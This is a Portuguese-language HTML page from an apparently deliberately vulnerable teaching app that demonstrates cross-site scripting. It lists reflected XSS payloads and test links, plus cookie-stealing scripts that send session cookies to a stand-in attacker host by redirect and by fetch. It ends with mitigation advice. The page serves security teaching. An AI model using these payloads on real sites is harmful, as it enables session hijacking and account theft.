<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exemplos de XSS - Aplica√ß√£o Vulner√°vel</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üî• Exemplos de Explora√ß√£o XSS</h1>
            <a href="/messages">‚Üê Voltar √†s mensagens</a>
        </div>
        
        <div class="vulnerability-info">
            <h2>üéØ Vulnerabilidades XSS Implementadas</h2>
            
            <div class="example-section">
                <h3>1. XSS Reflected na Cria√ß√£o de Mensagens</h3>
                <p><strong>Localiza√ß√£o:</strong> <code>/create-message</code></p>
                <p><strong>Par√¢metros vulner√°veis:</strong> <code>title</code>, <code>content</code></p>
                
                <div class="payload-examples">
                    <h4>Payloads para testar:</h4>
                    <p><strong>T√≠tulo:</strong> <code>&lt;script&gt;alert('XSS no t√≠tulo!')&lt;/script&gt;</code></p>
                    <p><strong>Conte√∫do:</strong> <code>&lt;img src=x onerror=alert('XSS no conte√∫do!')&gt;</code></p>
                    <p><strong>Cookie Stealer:</strong> <code>&lt;script&gt;document.location='http://atacante.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code></p>
                </div>
            </div>
            
            <div class="example-section">
                <h3>2. XSS Reflected na Busca de Mensagens</h3>
                <p><strong>Localiza√ß√£o:</strong> <code>/view-message</code></p>
                <p><strong>Par√¢metros vulner√°veis:</strong> <code>search</code>, <code>highlight</code></p>
                
                <div class="payload-examples">
                    <h4>URLs de teste:</h4>
                    <p><code>/view-message?search=&lt;script&gt;alert('XSS!')&lt;/script&gt;</code></p>
                    <p><code>/view-message?highlight=&lt;img src=x onerror=alert(document.cookie)&gt;</code></p>
                    <p><code>/view-message?search=&lt;svg onload=alert('SVG XSS')&gt;</code></p>
                </div>
            </div>
            
            <div class="example-section">
                <h3>3. Cen√°rio de Ataque Realista</h3>
                <p><strong>Objetivo:</strong> Roubar cookie de sess√£o do administrador</p>
                
                <div class="attack-scenario">
                    <h4>üé≠ Cen√°rio de Ataque:</h4>
                    <ol>
                        <li>Atacante cria mensagem com payload XSS</li>
                        <li>Administrador visualiza a mensagem</li>
                        <li>JavaScript malicioso executa no contexto do admin</li>
                        <li>Cookie de sess√£o √© enviado para servidor do atacante</li>
                        <li>Atacante usa cookie para fazer session hijacking</li>
                    </ol>
                </div>
                
                <div class="payload-examples">
                    <h4>Payload de Cookie Stealing:</h4>
                    <code>&lt;script&gt;
fetch('http://atacante.com/steal.php', {
    method: 'POST',
    body: JSON.stringify({
        cookie: document.cookie,
        url: window.location.href,
        user_agent: navigator.userAgent,
        timestamp: new Date().toISOString()
    })
});
&lt;/script&gt;</code>
                </div>
            </div>
            
            <div class="example-section">
                <h3>4. Demonstra√ß√£o Local (Simulada)</h3>
                <p>Para demonstrar localmente sem servidor externo:</p>
                
                <div class="demo-buttons">
                    <button onclick="demonstrateXSS()">üîç Demonstrar XSS B√°sico</button>
                    <button onclick="demonstrateCookieAccess()">üç™ Mostrar Cookies</button>
                    <button onclick="demonstrateSessionHijack()">üé≠ Simular Session Hijacking</button>
                </div>
                
                <div id="demo-output" class="demo-output"></div>
            </div>
            
            <div class="example-section">
                <h3>5. Links de Teste Direto</h3>
                <div class="test-links">
                    <a href="/view-message?search=<script>alert('XSS Direct Test!')</script>" target="_blank">
                        üîó Teste XSS no Search
                    </a>
                    <a href="/view-message?highlight=<img src=x onerror=alert('XSS Highlight!')>" target="_blank">
                        üîó Teste XSS no Highlight
                    </a>
                    <a href="/view-message?search=<svg onload=confirm('Cookie: ' + document.cookie)>" target="_blank">
                        üîó Teste Cookie Display
                    </a>
                </div>
            </div>
            
            <div class="mitigation-info">
                <h3>üõ°Ô∏è Mitiga√ß√£o das Vulnerabilidades</h3>
                <div class="mitigation-examples">
                    <h4>Como corrigir:</h4>
                    <ol>
                        <li><strong>Sanitiza√ß√£o de Entrada:</strong> Usar bibliotecas como DOMPurify</li>
                        <li><strong>Encoding de Sa√≠da:</strong> HTML encode antes de renderizar</li>
                        <li><strong>CSP:</strong> Content Security Policy headers</li>
                        <li><strong>HttpOnly Cookies:</strong> Prevenir acesso via JavaScript</li>
                        <li><strong>Valida√ß√£o:</strong> Whitelist de caracteres permitidos</li>
                    </ol>
                    
                    <h4>Exemplo de c√≥digo seguro:</h4>
                    <code>
// Ao inv√©s de:
res.send(`&lt;p&gt;${userInput}&lt;/p&gt;`);

// Use:
const escapeHtml = require('escape-html');
res.send(`&lt;p&gt;${escapeHtml(userInput)}&lt;/p&gt;`);
                    </code>
                </div>
            </div>
        </div>
    </div>

    <script>
        function demonstrateXSS() {
            const output = document.getElementById('demo-output');
            output.innerHTML = `
                <div class="demo-result">
                    <h4>‚úÖ XSS Executado com Sucesso!</h4>
                    <p>Esta √© uma demonstra√ß√£o segura de como o XSS funcionaria.</p>
                    <p>Em um ataque real, c√≥digo malicioso seria executado aqui.</p>
                </div>
            `;
            
            // Simular alerta de forma segura
            setTimeout(() => {
                alert('Demonstra√ß√£o: Este seria um XSS real em uma aplica√ß√£o vulner√°vel!');
            }, 500);
        }
        
        function demonstrateCookieAccess() {
            const output = document.getElementById('demo-output');
            const cookies = document.cookie || 'Nenhum cookie encontrado';
            
            output.innerHTML = `
                <div class="demo-result">
                    <h4>üç™ Cookies Acess√≠veis via JavaScript:</h4>
                    <p><strong>Cookies atuais:</strong></p>
                    <pre>${cookies}</pre>
                    <p><em>Em um ataque real, esses dados seriam enviados para o atacante.</em></p>
                </div>
            `;
        }
        
        function demonstrateSessionHijack() {
            const output = document.getElementById('demo-output');
            const sessionInfo = {
                cookie: document.cookie,
                url: window.location.href,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            };
            
            output.innerHTML = `
                <div class="demo-result">
                    <h4>üé≠ Simula√ß√£o de Session Hijacking:</h4>
                    <p>Dados que seriam enviados para o atacante:</p>
                    <pre>${JSON.stringify(sessionInfo, null, 2)}</pre>
                    <p><em>‚ö†Ô∏è Em um ataque real, esses dados permitiriam ao atacante assumir a sess√£o da v√≠tima!</em></p>
                </div>
            `;
            
            console.log('Dados de sess√£o capturados (simula√ß√£o):', sessionInfo);
        }
    </script>
</body>
</html>